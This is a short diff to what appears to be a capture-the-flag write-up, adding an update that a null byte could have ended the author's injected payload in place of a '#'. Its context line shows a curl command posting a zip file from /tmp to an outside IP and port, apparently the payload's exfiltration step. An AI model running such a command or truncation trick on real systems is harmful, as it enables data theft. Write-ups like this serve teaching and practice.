@@ -291,6 +291,10 @@ curl --data-binary @/tmp/z.zip 88.165.169.180:49153 #
 
 Why do things the simple way when you can do it the insanely convoluted way?
 
+##### update : null bytes
+
+after the release of this write-up, [iTrooz](https://itrooz.fr/) told me that instead of using a '`#`' to end my payload, I could have used a null-byte '`\x00`'. And indeed yes, I completely forgot about it and it would have perfectly worked. Thanks again for the reminder ^^'
+
 
 | Previous day | [[Day 06 - Unwrap The Gift]]    |
 | ------------ | ------------------------------- |
